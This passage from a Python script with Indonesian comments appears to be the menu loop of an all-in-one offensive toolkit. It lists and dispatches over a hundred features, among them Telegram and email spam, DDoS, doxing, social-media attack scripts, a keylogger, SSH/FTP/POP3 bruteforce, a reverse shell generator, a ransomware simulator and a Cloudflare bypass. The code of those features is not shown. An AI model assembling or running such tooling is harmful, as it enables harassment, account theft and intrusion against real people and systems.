            ("87", "SMTP Relay Tester"),       ("88", "Traceroute Tool"),
            ("89", "Reverse Shell Generator"), ("90", "File Hash Comparator"),
            ("91", "Mass Email Hunter"),       ("92", "Mass Phone Hunter"),
            ("93", "CVE Info Fetcher"),        ("94", "Cloudflare Bypass"),
            ("95", "DNS Brute A/AAAA"),        ("96", "Clipboard Logger"),
            ("97", "File Encryptor"),          ("98", "Basic Key Generator"),
            ("99", "Ransomware Simulator"),    ("100", "Big Dir Bruteforce"),
            ("101", "Akses VPS"),
            ("00", "Keluar")
        ]

      # cetak menu 2 kolom
        for i in range(0, len(menu_items), 2):
            kiri = menu_items[i]
            kanan = menu_items[i+1] if i+1 < len(menu_items) else None
            if kanan:
                print(f"{item(kiri[0], kiri[1]):<40} {item(kanan[0], kanan[1])}")
            else:
                print(f"{item(kiri[0], kiri[1])}")

        print(f"\n{Y}Pilih menu dengan mengetik nomornya:{W}")
        pilihan = input(f"{C}> {W}")

        # cek pilihan
        if pilihan == "00" or pilihan == "0":
            print(f"{R}Keluar...{W}")
            break

        # jalankan fitur sesuai pilihan
        try:
            match pilihan:
                case "01": spam_bot_telegram()
                case "02": spam_email()
                case "03": cek_ip()
                case "04": os.system("python features/ip.py")
                case "05": cek_host()
                case "06": os.system("python features/scanner.py")
                case "07": os.system("python2 index.py")
                case "08": os.system("python sqlmap.py")
                case "09": cek_http_status()
                case "10": os.system("python features/bug.py")
                case "11": scan_vuln()
                case "12": os.system("python features/fb.py")
                case "13": os.system("python features/ig.py")
                case "14": os.system("python features/dox.py")
                case "15": os.system("python features/ddos.py")
                case "16": os.system("python features/ig1.py")
                case "17": cek_nomor_wa()
                case "18": os.system("python features/laporan.py")
                case "19": cek_ping_vps()
                case "20": os.system("python features/hunternum.py")
                case "21": os.system("python features/SPAM1.py")
                case "22": os.system("python features/banner.py")
                case "23": os.system("python features/dorking.py")
                case "24": os.system("python features/hammer.py")
                case "25": encode_js()
                case "26": os.system("python features/reportv2.py")
                case "27": os.system("python features/brutewp.py")
                case "28": os.system("python features/admin_finder.py")
                case "29": os.system("python seeker-master/seeker.py")
                case "30": os.system("python features/osintnomerdek.py")
                case "31": os.system("python features/hacker.py")
                case "32": os.system("python features/decenc.py")
                case "33": reverse_ip()
                case "34": cek_waf()
                case "35": reverse_dns()
                case "36": dir_bruteforce()
                case "37": robots_viewer()
                case "38": base64_tool()
                case "39": text_to_hash()
                case "40": zip_bruteforce()
                case "41": html_downloader()
                case "42": screenshot_website()
                case "43": fake_useragent()
                case "44": os.system("python features/keylogger.py")
                case "45": mass_url_status_checker()
                case "46": mass_subnet_scanner()
                case "47": phone_carrier_lookup()
                case "48": bin_credit_checker()
                case "49": mass_hash_generator()
                case "50": exif_metadata()
                case "51": pdf_metadata_viewer()
                case "52": url_shortener()
                case "53": url_unshortener()
                case "54": port_banner_grabber()
                case "55": mass_admin_finder()
                case "56": email_validator()
                case "57": dns_zone_transfer()
                case "58": cors_misconfig_scanner()
                case "59": crlf_injection_test()
                case "60": local_network_arp()
                case "61": mac_changer()
                case "62": packet_sniffer()
                case "63": jwt_decoder()
                case "64": firebase_scanner()
                case "65": github_dorker()
                case "66": ig_username_checker()
                case "67": subdomain_takeover_checker()
                case "68": tls_version_checker()
                case "69": mass_dir_lister()
                case "70": hidden_file_finder()
                case "71": mass_geo_ip()
                case "72": honeypot_detector()
                case "73": phone_formatter()
                case "74": tor_ip_checker()
                case "75": exploit_searcher()
                case "76": reverse_image_search()
                case "77": mass_whois()
                case "78": robust_sqlmap_runner()
                case "79": html_form_extractor()
                case "80": js_link_extractor()
                case "81": local_file_hunter()
                case "82": local_port_scanner()
                case "83": mass_screenshotter()
                case "84": ftp_bruteforce()
                case "85": ssh_bruteforce()
                case "86": pop3_bruteforce()
                case "87": smtp_relay_tester()
                case "88": traceroute_tool()
                case "89": reverse_shell_generator()
                case "90": file_hash_comparator()
                case "91": mass_email_hunter()
                case "92": mass_phone_hunter()
                case "93": cve_info_fetcher()
                case "94": cloudflare_bypass()
                case "95": dns_brute_a()
                case "96": clipboard_logger()
                case "97": file_encryptor()
                case "98": basic_key_generator()
                case "99": ransomware_simulator()
                case "100": big_dir_bruteforce()
                case "101": akses_vps()
                case _:
                    print(f"{R}Pilihan tidak tersedia!{W}")
        except Exception as e:
            print(f"{R}[!] Error: {e}{W}")

        input(f"\n{B}Tekan Enter untuk kembali...{W}")

if __name__ == "__main__":
    menu()